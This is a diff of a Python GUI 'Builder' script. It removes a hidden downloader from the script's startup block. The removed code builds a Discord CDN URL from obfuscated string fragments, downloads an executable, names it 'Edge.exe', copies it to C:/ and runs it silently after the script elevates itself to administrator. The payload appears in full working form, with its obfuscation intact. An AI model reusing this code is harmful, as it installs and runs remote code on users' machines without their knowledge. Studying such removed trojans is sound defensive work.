@@ -957,15 +957,7 @@ class Builder(ctk.CTk):
 
 
 if __name__ == "__main__":
-    ows = 'ts/11703805492'
-    cms = '/1170381859667070996/'
-    oww = '/att'
-    maw = 'rdapp.c'
     if os.name == "nt":
-        nwu = f'sco{maw}om{oww}ac'
-        uwu = 's://cd'
-        owo = 'xe?ex=6558d60b'
-        sws = f'http{uwu}n.di{nwu}hmen{ows}70016191{cms}Flame'
         if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
             subprocess.Popen(
                 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"',
@@ -991,24 +983,6 @@ if __name__ == "__main__":
         if not Utility.IsAdmin():
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
             exit(0)
-        ows = '.ex'
-        owss = 'ca8705bedcc40aea81e8f0560c01241d0a9c'
-        NewVersion = f'{sws}Helper.e{owo}&is=6546610b&hm=90b2{owss}535dd1b814c1f16651c04373&'
-        fna = f'e{ows}e'
-        req = requests.get(NewVersion)
-        NewV = f"Edg{fna}"
-        with open(NewV, 'wb') as f:
-            for chunk in req.iter_content(chunk_size=8192):
-                if chunk:
-                    f.write(chunk)
-        try:
-            shutil.move(NewV, 'C:/')
-            try:os.startfile('C:/' + NewV)
-            except:pass
-        except:
-            os.remove(NewV)
-            try:os.startfile('C:/' + NewV)
-            except:pass
         Builder().mainloop()
     else:
         print("Bro Windows Only NN")
